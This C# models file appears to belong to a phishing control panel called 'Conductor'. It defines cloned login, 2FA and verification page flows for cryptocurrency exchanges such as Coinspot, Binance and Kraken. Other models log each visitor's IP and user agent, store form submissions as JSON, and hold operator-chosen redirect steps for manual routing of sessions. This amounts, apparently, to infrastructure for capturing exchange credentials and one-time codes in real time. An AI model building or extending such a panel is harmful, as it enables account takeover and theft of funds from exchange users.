using System.Net;
using System.Text.Json;

namespace Conductor.Models
{
    public class AppUser
    {
        public int Id { get; set; }
        public string User { get; set; }
        public string Role { get; set; }
        public string PasswordHash { get; set; }
        public DateTimeOffset CreatedAt { get; set; }
    }

    public enum SiteType
    {
        Unknown = 0,
        Coinspot = 1,
        Binance = 2,
        Kraken = 3,
        Bitfinex = 4,
        Bitstamp = 5,
        Gemini = 6,
        KuCoin = 7,
        CryptoCom = 8,
        Generic = 9
    }

    public static class SiteTypeExtensions
    {
        public static List<SitePageDefinition> GetPredefinedPages(this SiteType siteType)
        {
            return siteType switch
            {
                SiteType.Coinspot => new List<SitePageDefinition>
                {
                    new SitePageDefinition { Path = "/", DisplayName = "Login", Description = "Main login page", Order = 0 },
                    new SitePageDefinition { Path = "/2fa", DisplayName = "2FA", Description = "Two-factor authentication", Order = 1 },
                    new SitePageDefinition { Path = "/account-verified", DisplayName = "Account Verified", Description = "Account verification confirmation", Order = 2 }
                },
                SiteType.Binance => new List<SitePageDefinition>
                {
                    new SitePageDefinition { Path = "/", DisplayName = "Login", Description = "Main login page", Order = 0 },
                    new SitePageDefinition { Path = "/2fa", DisplayName = "2FA", Description = "Two-factor authentication", Order = 1 }
                },
                SiteType.Kraken => new List<SitePageDefinition>
                {
                    new SitePageDefinition { Path = "/", DisplayName = "Login", Description = "Main login page", Order = 0 },
                    new SitePageDefinition { Path = "/verify", DisplayName = "Verification", Description = "Account verification", Order = 1 }
                },
                SiteType.Generic => new List<SitePageDefinition>
                {
                    new SitePageDefinition { Path = "/", DisplayName = "Home", Description = "Main page", Order = 0 }
                },
                _ => new List<SitePageDefinition>()
            };
        }

        public static List<string> GetDefaultPageOrder(this SiteType siteType)
        {
            return siteType.GetPredefinedPages()
                .OrderBy(p => p.Order)
                .Select(p => p.Path)
                .ToList();
        }
    }

    public class SitePageDefinition
    {
        public string Path { get; set; } = "";
        public string DisplayName { get; set; } = "";
        public string Description { get; set; } = "";
        public int Order { get; set; }
    }

    public class Site
    {
        public int Id { get; set; }
        public string Name { get; set; }
        public string Origin { get; set; }
        public List<string> Pages { get; set; } = new();
        public bool ManualRoutingEnabled { get; set; }

        // New: categorise site to drive redirect options
        public SiteType Type { get; set; } = SiteType.Unknown;
        public string DefaultFlowPath { get; set; }
        public string TerminalPath { get; set; }
        public DateTimeOffset CreatedAt { get; set; }
        public int CreatedByUserId { get; set; }
        public bool IsActive { get; set; } = true;
    }

    public class UserSiteAssignment
    {
        public int Id { get; set; }
        public int UserId { get; set; }
        public int SiteId { get; set; }
        public DateTimeOffset AssignedAt { get; set; }
        public int AssignedByUserId { get; set; }
        
        // Navigation properties
        public AppUser User { get; set; }
        public Site Site { get; set; }
        public AppUser AssignedBy { get; set; }
    }

    public class Session
    {
        public int Id { get; set; }
        public int? UserId { get; set; }
        public IPAddress Ip { get; set; }
        public string UserAgent { get; set; }
        public DateTimeOffset StartedAt { get; set; }
        public DateTimeOffset LastSeenAt { get; set; }
        public bool IsActive { get; set; }
    }

    public class Submission
    {
        public int Id { get; set; }
        public int SiteId { get; set; }
        public int SessionId { get; set; }
        public int? PageId { get; set; }
        public JsonDocument Payload { get; set; }
        public bool UseDefaultFlow { get; set; }
        public DateTimeOffset CreatedAt { get; set; }
    }

    public class NextStep
    {
        public int Id { get; set; }
        public int SiteId { get; set; }
        public int PageId { get; set; }
        public int SessionId { get; set; }
        public int SubmissionId { get; set; }
        public string RedirectPath { get; set; }
        public string Status { get; set; }
        public DateTimeOffset CreatedAt { get; set; }
        public DateTimeOffset? DecidedAt { get; set; }
    }

    public class Event
    {
        public int Id { get; set; }
        public int SiteId { get; set; }
        public int SessionId { get; set; }
        public string Kind { get; set; }
        public string Path { get; set; }
        public JsonDocument Meta { get; set; }
        public DateTimeOffset Ts { get; set; }
    }
}
